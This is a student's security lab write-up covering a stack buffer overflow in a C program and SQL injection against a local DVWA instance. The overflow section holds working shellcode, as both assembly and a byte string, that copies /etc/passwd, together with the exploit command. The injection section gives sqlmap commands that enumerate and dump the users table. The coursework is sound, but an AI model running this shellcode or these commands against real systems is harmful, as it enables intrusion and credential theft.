# Lab #1,22110016, Nguyen Huu Danh, INSE330380E_01FIE

# Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile

```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```

**Question 1**:

- Compile asm program and C program to executable code.
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  **Answer 1**: Must conform to below structure:

I saved the vulnerable C program the file file lab_1.c and shellcode into shellcode.asm.
In order to attack, I will first convert the shellcode.asm into machine code using the following commands.

```
nasm -g -f elf shellcode.asm

ld -m elf_i386 -o shellcode shellcode.o

for i in $(objdump -d shellcode |grep "^ " |cut -f2); do echo-n '\x'$i; done;echo
```

And here is the shellcode in machine format, which is 97 bytes long.

```
\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80
```

Consider the stack frame of the main function.

<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2009.46.51.png"><br>

```
Padding to overflow the buffer
 "a" * 20
```

```
Address to overwrite the return address is :
'\x30\xd6\xff\xff'
```

- Then eject the shellcode into :

```
run $(python3 -c "print('\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80' + 'a' * 20 + '\x30\xd6\xff\xff')")
```

**Conclusion**: the /etc/passwd file will be copied to /tmp/pwfile. This demonstrates how a buffer overflow vulnerability can be exploited to execute arbitrary code.

# Task 2: Attack on database of DVWA

- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Idenrify a vulnerable URL** : Navigate to the DVWA SQL Injection page and find a URL that includes a parameter
http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit.

**Run sqlmap to enumerate databases:**
Find PHPSESSID :

<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.01.49.png"><br>

Then :

```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<veum4ka5g5rqc8rcnghg20ch00>; security=low" --dbs

```

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
Get tables from a specific database:

```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=veum4ka5g5rqc8rcnghg20ch00; security=low" -D dvwa --tables
```

<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.12.23.png"><br>

Get columns from a specific table

```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session_id>; security=low" -D dvwa -T users --columns

```

<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.13.29.png"><br>

Dump user information:

```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session_id>; security=low" -D dvwa -T users --dump

```

<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.15.19.png"><br>

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
